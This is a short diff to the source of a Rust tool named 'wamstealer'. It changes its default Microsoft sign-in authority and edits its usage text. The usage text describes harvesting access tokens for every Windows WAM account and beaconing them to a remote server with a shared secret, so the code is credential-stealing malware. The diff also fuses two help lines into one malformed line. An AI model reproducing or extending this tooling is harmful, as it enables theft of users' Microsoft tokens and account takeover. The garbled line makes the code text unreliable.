@@ -8,7 +8,7 @@ pub mod wam;
 
 pub const DEFAULT_CLIENT_ID: &str = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
 pub const DEFAULT_SCOPE: &str = "https://graph.microsoft.com/.default";
-pub const DEFAULT_AUTHORITY: &str = "common";
+pub const DEFAULT_AUTHORITY: &str = "organizations";
 pub const PROVIDER_ID: &str = "https://login.microsoft.com";
 pub const CAE_CLAIMS: &str = r#"{"access_token":{"xms_cc":{"values":["cp1"]}}}"#;
 pub const RESERVED_SCOPES: &str = " openid offline_access profile";
@@ -20,10 +20,9 @@ Usage: wamstealer [options]
   --server URL            Beacon mode: request tokens for every account and send
                           them to an WAMStealer server over HTTPS
   --secret VALUE          Shared secret of the WAMStealer server (required with --server)
-  --client-id VALUE       Public client ID (default: Microsoft Office)
-  --scope VALUE           v2 scope string (default: Graph .default)
+  --client-id VALUE       Public client ID (default: Microsoft Office)  --scope VALUE           v2 scope string (default: Graph .default)
   --resource VALUE        WAM v1-compatible resource; exclusive with --scope
-  --authority VALUE       Provider authority (default: common)
+  --authority VALUE       Provider authority (default: organizations)
   --enum                  Enumerate accounts and exit
   --account-id VALUE      Select an exact WAM account ID
   --username VALUE        Select one exact, unique username (case-insensitive)
